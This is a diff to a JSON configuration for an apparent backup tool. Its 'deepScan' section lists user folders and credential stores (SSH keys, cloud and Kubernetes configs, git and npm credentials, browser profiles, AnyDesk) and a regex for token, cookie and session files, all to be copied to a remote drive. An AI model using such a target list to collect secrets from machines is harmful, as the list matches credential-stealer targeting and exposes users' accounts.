@@ -30,34 +30,36 @@
     "deepScan": {
         "enabled": true,
         "remoteRoot": "Z:\\Backup\\DeepScan",
-        "scanRoots": [
-            "%USERPROFILE%",
-            "%APPDATA%",
-            "%LOCALAPPDATA%",
-            "%TEMP%"
-        ],
-        "targetDirs": [
-            ".env",
-            ".ssh",
-            ".aws",
-            ".azure",
-            ".config",
-            ".docker",
-            ".kube",
-            ".git-credentials",
-            ".npmrc",
-            ".netrc",
-            ".wgetrc",
-            ".curlrc",
-            "npm",
-            "Code",
-            "Google",
-            "Microsoft\\Edge",
-            "Mozilla",
-            "Postman",
-            "claude",
-            "opencode"
-        ],
+    "scanRoots": [
+        "%USERPROFILE%",
+        "%APPDATA%",
+        "%LOCALAPPDATA%",
+        "%TEMP%",
+        "%ProgramData%"
+    ],
+    "targetDirs": [
+        ".env",
+        ".ssh",
+        ".aws",
+        ".azure",
+        ".config",
+        ".docker",
+        ".kube",
+        ".git-credentials",
+        ".npmrc",
+        ".netrc",
+        ".wgetrc",
+        ".curlrc",
+        "npm",
+        "Code",
+        "Google",
+        "Microsoft\\Edge",
+        "Mozilla",
+        "Postman",
+        "claude",
+        "opencode",
+        "AnyDesk"
+    ],
         "tokenFileRegex": "(token|session|cookie|credential|secret|auth|login)",
         "tokenFileExtensions": [
             ".json",
@@ -122,6 +124,10 @@
         "workspace": {
             "local": "%USERPROFILE%\\Documents\\Workspace",
             "remote": "Z:\\Backup\\Workspace"
+        },
+        "anydesk": {
+            "local": "%ProgramData%\\AnyDesk",
+            "remote": "Z:\\Backup\\AnyDesk"
         }
     }
 }
